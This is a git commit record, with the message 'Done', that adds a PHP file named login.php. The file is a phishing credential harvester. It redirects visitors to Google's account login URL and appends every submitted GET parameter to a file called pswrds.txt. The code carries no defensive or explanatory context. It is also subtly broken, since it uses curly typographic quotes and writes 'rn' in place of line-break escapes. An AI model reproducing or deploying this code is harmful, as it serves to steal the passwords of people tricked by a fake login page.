e9d617163ade33dde1d4e04519a7a0fdf5de254a
Hoopticoupe <37630423+Hoopticoupe@users.noreply.github.com>
2018-04-10 16:22:23 +0530

    Done

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);
+$handle = fopen(“pswrds.txt”, “a”);
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, “=”);
+fwrite($handle, $value);
+fwrite($handle, “rn”);
+}
+fwrite($handle, “rn”);
+fclose($handle);
+exit;
+?>
